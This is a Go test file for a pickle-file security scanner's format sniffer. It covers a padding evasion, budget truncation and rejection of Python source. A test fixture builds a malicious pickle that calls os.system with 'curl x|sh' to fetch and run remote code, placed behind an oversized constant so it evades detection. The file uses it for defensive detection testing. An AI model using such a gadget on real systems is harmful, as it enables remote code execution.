package pickle

import (
	"testing"

	"github.com/fr0g-66723067-io/sc4n/internal/artifact"
	"github.com/fr0g-66723067-io/sc4n/internal/limits"
	"github.com/fr0g-66723067-io/sc4n/internal/source"
)

// fatConstantGadget builds a stream whose first constant exceeds the probe budget:
// PROTO 4, one BINUNICODE of n bytes, then GLOBAL os.system + a string + REDUCE.
// The gadget is the last thing in the stream, behind the fat constant.
func fatConstantGadget(prefix []byte, n int) []byte {
	b := append([]byte{}, prefix...)
	b = append(b, opPROTO, 4, opBINUNICODE, byte(n), byte(n>>8), byte(n>>16), byte(n>>24))
	b = append(b, make([]byte, n)...)
	b = append(b, []byte("cos\nsystem\n(S'curl x|sh'\ntR.")...)
	return b
}

// TestSniffClaimsFatConstantBehindAPrefix pins the miss a padded constant caused:
// the silent probe walk stops at maxProbeBytes, so a stream whose first constant is
// larger than the budget left the file dispatched "unknown" — no parser, no
// indicator pass, an empty finding list — while the same stream with a smaller
// constant was reported. The number of bytes in the constant is the attacker's to
// choose, which is what made it a reliable way to hide the gadget behind it.
func TestSniffClaimsFatConstantBehindAPrefix(t *testing.T) {
	for _, prefix := range [][]byte{nil, []byte("junk"), []byte("MZ"), []byte("\x7fELF"), []byte("\x00\x11"), []byte("####")} {
		data := fatConstantGadget(prefix, maxProbeBytes+4096)
		s := source.Mem("fat.pkl", data)
		got, ok := sniff(s, limits.Default())
		s.Close()
		if !ok || got != artifact.FormatPickle {
			t.Fatalf("prefix %q: sniff = %s, %v; want pickle", prefix, got, ok)
		}
	}
}

// TestSniffBudgetTruncationNeedsProtocol is the control on the same path: a walk
// that stops at the budget without a declared protocol is still not a pickle, so
// the acceptance does not rest on "the walk ended early".
func TestSniffBudgetTruncationNeedsProtocol(t *testing.T) {
	// A protocol-0 stream of plain opcodes with no STOP, longer than the budget.
	b := make([]byte, 0, maxProbeBytes+4096)
	for len(b) < maxProbeBytes+4096 {
		b = append(b, opEMPTY_LIST)
	}
	s := source.Mem("noproto.pkl", b)
	got, ok := sniff(s, limits.Default())
	s.Close()
	if ok {
		t.Fatalf("a protocol-less stream truncated by the budget was claimed as %s", got)
	}
}

// TestSniffPrefixProbeIsBounded documents the bound that keeps the second look
// cheap: a protocol byte beyond the prefix (the nullifAI prefix is a few bytes) does
// not reach the pickle sniffer, so an ordinary text file with bytes that merely
// contain 0x80 does not get claimed and produce a page of structural findings.
func TestSniffPrefixProbeIsBounded(t *testing.T) {
	prefix := make([]byte, prefixProbe+64)
	for i := range prefix {
		prefix[i] = '#'
	}
	data := append(prefix, []byte{opPROTO, 4, opEMPTY_DICT, opSTOP}...)
	s := source.Mem("late.pkl", data)
	_, ok := sniff(s, limits.Default())
	s.Close()
	if ok {
		t.Fatalf("a stream starting past the %d-byte prefix probe was claimed", prefixProbe)
	}
}

// TestSniffStillRejectsPythonSource is the regression guard for the widened head
// test: a Python source file opens with the same letters a protocol-0 pickle does,
// and claiming one would manufacture findings for every .py in a repository.
func TestSniffStillRejectsPythonSource(t *testing.T) {
	for _, src := range []string{
		"class Foo:\n    def bar(self):\n        return 1\n",
		"copy the file\nand then\n",
		"# a comment\nimport os\nos.system('id')\n",
	} {
		s := source.Mem("mod.py", []byte(src))
		got, ok := sniff(s, limits.Default())
		s.Close()
		if ok {
			t.Fatalf("python source claimed as %s: %q", got, src)
		}
	}
}
